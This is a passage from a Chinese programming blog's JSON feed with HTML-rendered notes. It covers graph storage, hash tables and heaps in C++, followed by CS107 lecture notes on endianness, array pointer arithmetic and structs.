class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">]</span></span></span></span>  之间是否有边。</p>\n<pre><code class=\"language-c++\">int vertices[5] = &#123;1, 2, 3, 4, 5&#125;;\nint edges[5][5] = &#123;&#123;0, 1, 1, 1, 1&#125;,\n                      &#123;1, 0, 0, 1, 0&#125;,\n                      &#123;1, 0, 0, 0, 1&#125;,\n                      &#123;1, 1, 0, 0, 1&#125;,\n                      &#123;1, 0, 1, 1, 0&#125;&#125;;\n</code></pre>\n</li>\n<li>\n<p><strong>邻接表：</strong> 使用数组 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>v</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi>i</mi><mi>c</mi><mi>e</mi><mi>s</mi></mrow><annotation encoding=\"application/x-tex\">vertices</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span></span></span></span> 存储顶点，邻接表 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>e</mi><mi>d</mi><mi>g</mi><mi>e</mi><mi>s</mi></mrow><annotation encoding=\"application/x-tex\">edges</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span></span></span></span> 存储边。<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>e</mi><mi>d</mi><mi>g</mi><mi>e</mi><mi>s</mi></mrow><annotation encoding=\"application/x-tex\">edges</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span></span></span></span> 为一个二维容器，第一维 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 代表顶点索引，第二维 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>e</mi><mi>d</mi><mi>g</mi><mi>e</mi><mi>s</mi><mo stretchy=\"false\">[</mo><mi>i</mi><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">edges[i]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mopen\">[</span><span class=\"mord mathnormal\">i</span><span class=\"mclose\">]</span></span></span></span> 存储此顶点对应的边集和；例如 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>e</mi><mi>d</mi><mi>g</mi><mi>e</mi><mi>s</mi><mo stretchy=\"false\">[</mo><mn>0</mn><mo stretchy=\"false\">]</mo><mo>=</mo><mo stretchy=\"false\">[</mo><mn>1</mn><mo separator=\"true\">,</mo><mn>2</mn><mo separator=\"true\">,</mo><mn>3</mn><mo separator=\"true\">,</mo><mn>4</mn><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">edges[0] = [1,2,3,4]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mopen\">[</span><span class=\"mord\">0</span><span class=\"mclose\">]</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">3</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">4</span><span class=\"mclose\">]</span></span></span></span> 代表 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>v</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi>i</mi><mi>c</mi><mi>e</mi><mi>s</mi><mo stretchy=\"false\">[</mo><mn>0</mn><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">vertices[0]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mopen\">[</span><span class=\"mord\">0</span><span class=\"mclose\">]</span></span></span></span> 的边集合为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">[</mo><mn>1</mn><mo separator=\"true\">,</mo><mn>2</mn><mo separator=\"true\">,</mo><mn>3</mn><mo separator=\"true\">,</mo><mn>4</mn><mo stretchy=\"false\">]</mo><mtext>。</mtext></mrow><annotation encoding=\"application/x-tex\">[1,2,3,4]。</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">3</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">4</span><span class=\"mclose\">]</span><span class=\"mord cjk_fallback\">。</span></span></span></span></p>\n<pre><code class=\"language-c++\">int vertices[5] = &#123;1, 2, 3, 4, 5&#125;;\nvector&lt;vector&lt;int&gt;&gt; edges;\n\nvector&lt;int&gt; edge_1 = &#123;1, 2, 3, 4&#125;;\nvector&lt;int&gt; edge_2 = &#123;0, 3&#125;;\nvector&lt;int&gt; edge_3 = &#123;0, 4&#125;;\nvector&lt;int&gt; edge_4 = &#123;0, 1, 4&#125;;\nvector&lt;int&gt; edge_5 = &#123;0, 2, 3&#125;;\nedges.push_back(edge_1);\nedges.push_back(edge_2);\nedges.push_back(edge_3);\nedges.push_back(edge_4);\nedges.push_back(edge_5);\n</code></pre>\n</li>\n</ol>\n<blockquote>\n<p><strong>邻接矩阵 VS 邻接表 ：</strong></p>\n<p>邻接矩阵的大小只与节点数量有关，即 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>N</mi><mn>2</mn></msup></mrow><annotation encoding=\"application/x-tex\">N^2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span> ，其中 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>N</mi></mrow><annotation encoding=\"application/x-tex\">N</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span></span></span></span> 为节点数量。因此，当边数量明显少于节点数量时，使用邻接矩阵存储图会造成较大的内存浪费。<br>\n因此，邻接表 适合存储稀疏图（顶点较多、边较少）； 邻接矩阵 适合存储稠密图（顶点较少、边较多）。</p>\n</blockquote>\n<h2 id=\"散列表\"><a class=\"markdownIt-Anchor\" href=\"#散列表\">#</a> 散列表</h2>\n<p>散列表是一种非线性数据结构，通过利用 Hash 函数将指定的「键  <code>key</code> 」映射至对应的「值  <code>value</code> 」，以实现高效的元素查找。</p>\n<blockquote>\n<p>设想一个简单场景：小力、小特、小扣的学号分别为 10001, 10002, 10003 。<br>\n现需求从「姓名」查找「学号」。</p>\n</blockquote>\n<p>则可通过建立姓名为  <code>key</code>  ，学号为  <code>value</code>  的散列表实现此需求，代码如下：</p>\n<pre><code class=\"language-c++\">// 初始化散列表\nunordered_map&lt;string, int&gt; dic;\n\n// 添加 key -&gt; value 键值对\ndic[&quot;小力&quot;] = 10001;\ndic[&quot;小特&quot;] = 10002;\ndic[&quot;小扣&quot;] = 10003;\n\n// 从姓名查找学号\ndic.find(&quot;小力&quot;)-&gt;second; // -&gt; 10001\ndic.find(&quot;小特&quot;)-&gt;second; // -&gt; 10002\ndic.find(&quot;小扣&quot;)-&gt;second; // -&gt; 10003\n</code></pre>\n<p>![Picture8.png](C++ 常见的数据结构 / 1599811794-ruXMOV-Picture8.png)</p>\n<h3 id=\"hash-函数设计示例\"><a class=\"markdownIt-Anchor\" href=\"#hash-函数设计示例\">#</a> Hash 函数设计示例 ：</h3>\n<blockquote>\n<p>假设需求：从「学号」查找「姓名」。</p>\n</blockquote>\n<p>将三人的姓名存储至以下数组中，则各姓名在数组中的索引分别为 0, 1, 2 。</p>\n<pre><code class=\"language-c++\">string names[] = &#123; &quot;小力&quot;, &quot;小特&quot;, &quot;小扣&quot; &#125;;\n</code></pre>\n<p>此时，我们构造一个简单的 Hash 函数（ %% 为取余符号 ），公式和封装函数如下所示：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>h</mi><mi>a</mi><mi>s</mi><mi>h</mi><mo stretchy=\"false\">(</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mo stretchy=\"false\">(</mo><mi>k</mi><mi>e</mi><mi>y</mi><mo>−</mo><mn>1</mn><mo stretchy=\"false\">)</mo><mi mathvariant=\"normal\">%</mi><mn>10000</mn></mrow><annotation encoding=\"application/x-tex\">hash(key)=(key-1)\\%10000\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">h</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">)</span><span class=\"mord\">%</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">0</span></span></span></span></span></p>\n<pre><code class=\"language-c++\">int hash(int id)&#123;\n\tint index = (id - 1) % 10000;\n    return index; &#125;\n</code></pre>\n<p>则我们构建了以学号为  <code>key</code>  、姓名对应的数组索引为  <code>value</code>  的散列表。利用此 Hash 函数，则可在 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>O</mi><mo stretchy=\"false\">(</mo><mn>1</mn><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">O(1)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mopen\">(</span><span class=\"mord\">1</span><span class=\"mclose\">)</span></span></span></span> 时间复杂度下通过学号查找到对应姓名，即：</p>\n<pre><code class=\"language-c++\">names[hash(10001)] // 小力\nnames[hash(10002)] // 小特\nnames[hash(10003)] // 小扣\n</code></pre>\n<p>![Picture8-1.png](C++ 常见的数据结构 / 1599811794-NfbpfW-Picture8-1.png)</p>\n<p>以上设计只适用于此示例，实际的 Hash 函数需保证低碰撞率、 高鲁棒性等，以适用于各类数据和场景。</p>\n<h2 id=\"堆\"><a class=\"markdownIt-Anchor\" href=\"#堆\">#</a> 堆</h2>\n<p>堆是一种基于「完全二叉树」的数据结构，可使用数组实现。以堆为原理的排序算法称为「堆排序」，基于堆实现的数据结构为「优先队列」。堆分为「大顶堆」和「小顶堆」，大（小）顶堆：任意节点的值不大于（小于）其父节点的值。</p>\n<blockquote>\n<p><strong>完全二叉树定义：</strong> 设二叉树深度为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span></span></span></span> ，若二叉树除第 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span></span></span></span> 层外的其它各层（第 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span> 至 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">k-1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span> 层）的节点达到最大个数，且处于第 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span></span></span></span> 层的节点都连续集中在最左边，则称此二叉树为完全二叉树。</p>\n</blockquote>\n<p>如下图所示，为包含  <code>1, 4, 2, 6, 8</code>  元素的小顶堆。将堆（完全二叉树）中的结点按层编号，即可映射到右边的数组存储形式。</p>\n<p>![Picture9.png](C++ 常见的数据结构 / 1599584901-xoiGEQ-Picture9.png)</p>\n<p>通过使用「优先队列」的「压入  <code>push()</code> 」和「弹出  <code>pop()</code> 」操作，即可完成堆排序，实现代码如下：</p>\n<pre><code class=\"language-c++\">// 初始化小顶堆\npriority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; heap;\n\n// 元素入堆\nheap.push(1);\nheap.push(4);\nheap.push(2);\nheap.push(6);\nheap.push(8);\n\n// 元素出堆（从小到大）\nheap.pop(); // -&gt; 1\nheap.pop(); // -&gt; 2\nheap.pop(); // -&gt; 4\nheap.pop(); // -&gt; 6\nheap.pop(); // -&gt; 8\n</code></pre>\n",
            "tags": [
                "C++_Leetcode"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/11/05/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_3/",
            "url": "http://yanagi-kon.github.io/2023/11/05/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_3/",
            "title": "斯坦福编程范式CS107_3",
            "date_published": "2023-11-05T12:28:00.000Z",
            "content_html": "<h1 id=\"斯坦福编程范式cs107_3\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_3\">#</a> 斯坦福编程范式 CS107_3</h1>\n<h2 id=\"1大端存储小端存储\"><a class=\"markdownIt-Anchor\" href=\"#1大端存储小端存储\">#</a> 1. 大端存储，小端存储</h2>\n<p>端模式（Endian）的这个词出自 Jonathan Swift 书写的《格列佛游记》。这本书根据将鸡蛋敲开的方法不同将所有的人分为两类，** 从圆头开始将鸡蛋敲开的人被归为 Big Endian，从尖头开始将鸡蛋敲开的人被归为 Littile Endian（这句话最为形象）。** 小人国的内战就源于吃鸡蛋时是究竟从大头（Big-Endian）敲开还是从小头（Little-Endian）敲开。在计算机业 Big Endian 和 Little Endian 也几乎引起一场战争。在计算机业界，Endian 表示数据在存储器中的存放顺序。下文举例说明在计算机中大小端模式的区别。</p>\n<p>如果将一个 32 位的整数 0x12345678 存放到一个整型变量（int）中，这个整型变量采用大端或者小端模式在内存中的存储由下表所示。为简单起见，本文使用 OP0 表示一个 32 位数据的最高字节 MSB（Most Significant Byte），使用 OP3 表示一个 32 位数据最低字节 LSB（Least Significant Byte）。</p>\n<table>\n<thead>\n<tr>\n<th>地址偏移</th>\n<th>大端模式</th>\n<th>小端模式</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0x00</td>\n<td>12（OP0）</td>\n<td>78（OP3）</td>\n</tr>\n<tr>\n<td>0x01</td>\n<td>34（OP1）</td>\n<td>56（OP2）</td>\n</tr>\n<tr>\n<td>0x02</td>\n<td>56（OP2）</td>\n<td>34（OP1）</td>\n</tr>\n<tr>\n<td>0x03</td>\n<td>78（OP3）</td>\n<td>12（OP0）</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>小端： <code>较高的有效字节存放在较高的的存储器地址</code> ， <code>较低的有效字节</code> 存放在 <code>较低的存储器地址</code> 。</li>\n<li>大端： <code>较高的有效字节存放在较低的存储器地址</code> ， <code>较低的有效字节</code> 存放在 <code>较高的存储器地址</code> 。</li>\n</ul>\n<p>采用大小模式对数据进行存放的主要区别在于在存放的字节顺序，大端方式将 <code>高数据位</code> 存放在 <code>低地址</code> ，小端方式将 <code>高数据位</code> 存放在 <code>高地址</code> 。采用大端方式进行数据存放符合人类的正常思维，而采用小端方式进行数据存放利于计算机处理。到目前为止，采用大端或者小端进行数据存放，其孰优孰劣也没有定论。大端与小端模式的差别体现在一个处理器的寄存器，指令集，系统总线等各个层次中。</p>\n<p>用函数判断系统是 Big Endian 还是 Little Endian</p>\n<p>方法一：</p>\n<p>short 类型占用 2 字节， char 类型占用 1 字节</p>\n<pre><code class=\"language-C\">//如果字节序为big-endian，返回true;  \n//反之为   little-endian，返回false  \n\nbool IsBig_Endian()\n&#123;\n    unsigned short test = 0x1234;\n    if(*( (unsigned char*) &amp;test ) == 0x12)\n       return TRUE;\n   else\n       return FALSE;\n&#125;//IsBig_Endian()\n</code></pre>\n<p>方法二：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">checkCPUendian</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">// 返回 1，为小端；反之，为大端；</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">union</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span>  a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    c<span class=\"token punctuation\">.</span>a <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">1</span> <span class=\"token operator\">==</span> c<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>\n<p>字节序的使用：</p>\n<p>大端模式处理器的字节序到网络字节序不需要转换，此时 ntohs (n)=n，ntohl =n；而小端模式处理器的字节序到网络字节必须要进行转换 (同理，有时候需要将大端字节顺序转换成小端字节顺序，也用这个函数，因为这个函数本来就是用来颠倒字节顺序的)，转换如下：</p>\n</li>\n</ul>\n<pre><code class=\"language-C\">#if defined(BIG_ENDIAN) &amp;&amp; !defined(LITTLE_ENDIAN)\n   #define htons(A)  (A)\n   #define htonl(A)  (A)\n   #define ntohs(A)  (A)\n   #define ntohl(A)  (A)\n\n#elif defined(LITTLE_ENDIAN) &amp;&amp; !defined(BIG_ENDIAN)\n   #define htons(A)  ((((uint16_t)(A) &amp; 0xff00) &gt;&gt; 8 ) | \\\\\n                      (((uint16_t)(A) &amp; 0x00ff) &lt;&lt; 8 ))\n   #define htonl(A)  ((((uint32_t)(A) &amp; 0xff000000) &gt;&gt; 24)  | \\\\\n                      (((uint32_t)(A) &amp; 0x00ff0000) &gt;&gt; 8 )  | \\\\\n                      (((uint32_t)(A) &amp; 0x0000ff00) &lt;&lt; 8 )  | \\\\\n                      (((uint32_t)(A) &amp; 0x000000ff) &lt;&lt; 24))\n   #define ntohs     htons\n   #define ntohl     htohl\n#else\n   #error Either BIG_ENDIAN or LITTLE_ENDIAN must be #defined, but not both.\n#endif\n</code></pre>\n<h2 id=\"2关于数组\"><a class=\"markdownIt-Anchor\" href=\"#2关于数组\">#</a> 2. 关于数组</h2>\n<h3 id=\"例子一\"><a class=\"markdownIt-Anchor\" href=\"#例子一\">#</a> 例子一</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> array<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>array 等价于 &amp;array [0]</p>\n<p>array + k 等价于 &amp;array [k]</p>\n<p>*array 等价于 array [0]</p>\n<p>*(array + k) 等价于 array [k]</p>\n<h3 id=\"例子二\"><a class=\"markdownIt-Anchor\" href=\"#例子二\">#</a> 例子二</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>arr<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">128</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">short</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>cout <span class=\"token operator\">&lt;&lt;</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这个时候打印出来的不是 128，而是 512 + 128，这个时候在 arr [3] 中的内容为：</p>\n<p>00000000 00000010 128 = 512 + 128 （这里在课上应该是采用的小端方法）</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">short</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"3关于struct\"><a class=\"markdownIt-Anchor\" href=\"#3关于struct\">#</a> 3. 关于 Struct</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">student</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>name<span class=\"token 